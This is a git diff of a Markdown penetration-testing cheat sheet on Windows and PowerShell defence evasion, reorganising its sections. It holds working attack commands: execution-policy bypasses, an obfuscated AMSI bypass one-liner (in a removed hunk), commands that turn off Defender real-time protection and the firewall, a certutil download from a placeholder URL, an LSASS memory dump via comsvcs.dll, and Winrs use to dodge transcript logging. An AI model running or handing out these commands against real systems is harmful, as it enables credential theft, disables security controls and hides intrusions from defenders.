@@ -1,4 +1,17 @@
 # Evasion
+## Index
+* [General](#General)
+* [PowerShell](#PowerShell)
+	* [Execution-policy](#Execution-policy)
+	* [AMSI](#AMSI)
+	* [Constrained Language Mode](#Constrained-Language-Mode)
+		* [Powershdll](#Powershdll)
+	* [Applocker](#Applocker)
+		* [LOLBAS](#LOLBAS)
+	* [Logging evasion](#Logging-evasion)
+* [Defense evasion](#Defense-evasion)
+* [AV Bypass](#AV-Bypass)
+
 ## General
 #### Get all GPO's applied to a machine
 - Run with elevated prompt
@@ -12,7 +25,23 @@ gpresult -h gpos.html
 - AntiMalware Scan Interface (AMSI)
 - Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
 
-## AMSI
+## PowerShell
+### Execution-policy
+#### Get Execution policy
+```
+Get-Executionpolicy
+```
+
+#### Bypass execution policy
+- Not meant to be a security measure
+```
+powershell –executionpolicy bypass .\script.ps1
+powershell –c <cmd>
+powershell –enc
+powershell.exe -executionpolicy bypass
+```
+
+### AMSI
 - https://github.com/aloksaurabh/OffenPowerSh/blob/master/Bypass/Invoke-AlokS-AvBypass.ps1
 - https://amsi.fail/
 - Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
@@ -49,44 +78,7 @@ $3 = b64decode("Tm9uUHVibGljLFN0YXRpYw==")
 - Then obfuscate strings with https://github.com/danielbohannon/Invoke-Obfuscation
 - Repeat
 
-## Execution-policy
-#### Get Execution policy
-```
-Get-Executionpolicy
-```
-
-#### Bypass execution policy
-- Not meant to be a security measure
-```
-powershell –executionpolicy bypass .\script.ps1
-powershell –c <cmd>
-powershell –enc
-powershell.exe -executionpolicy bypass
-```
-
-## Defense evasion
-#### Check if windows defender is running
-```
-Get-MpComputerStatus
-Get-MpComputerStatus | Select RealTimeProtectionEnabled
-```
-
-#### Disable AV monitoring
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPReference -DisableIOAVProtection $true
-
-powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
-```
-
-#### Disable Firewall
-```
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
-
-powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
-```
-
-## Constrained Lanuage Mode
+### Constrained Lanuage Mode
 #### Check the language mode
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -132,7 +124,7 @@ Write-Host $ExecutionContext.SessionState.LanguageMode
 Start-Sleep -s 10
 ```
 
-#### PowerShdll Run PowerShell with dlls only.
+### PowerShdll Run PowerShell with dlls only.
 - https://github.com/p3nt4/PowerShdll
 - Does not require access to powershell.exe as it uses powershell automation dlls.
 ```
@@ -149,11 +141,7 @@ certutil -urlcache -split -f <URL>
 - It is possible to execute scripts on the filesystem but you can't load them!
 - If applocker is there enumerate it to find a directory that lets you execute scripts in
 
-#### Execute scripts
-- It is possible to execute scripts on the filesystem but you can't load them!
-- If applocker is there enumerate it to find a directory that lets you execute scripts in
-
-## Applocker
+### Applocker
 #### Check if applocker policy is running
 ```
 Get-AppLockerPolicy -Effective
@@ -196,18 +184,8 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass
 dir C:\Users\Public\lsass.dmp
 ```
 
-## AMSI Bypass
-- https://amsi.fail/
-- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
-```
-S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
-```
-
-```
-Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
-```
-
-## Invisi-shell
+### Logging evasion
+#### Invisi-shell
 - Bypasses Sytem-Wide transcript
 - https://github.com/OmerYa/Invisi-Shell
 - Type exit from the new PowerShell session to complete the clean-up.
@@ -222,14 +200,36 @@ Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + (
 RunWithRegistryNonAdmin.bat
 ```
 
-## Winrs
+##### Winrs
 - Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
 ```
 winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
 ```
 
-## Com objects
+##### Com objects
 - https://github.com/bohops/WSMan-WinRM
+
+## Defense evasion
+#### Check if windows defender is running
+```
+Get-MpComputerStatus
+Get-MpComputerStatus | Select RealTimeProtectionEnabled
+```
+
+#### Disable AV monitoring
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPReference -DisableIOAVProtection $true
+
+powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
+```
+
+#### Disable Firewall
+```
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
+
+powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
+```
 
 ## AV Bypass
 - Can also use https://github.com/rasta-mouse/ThreatCheck
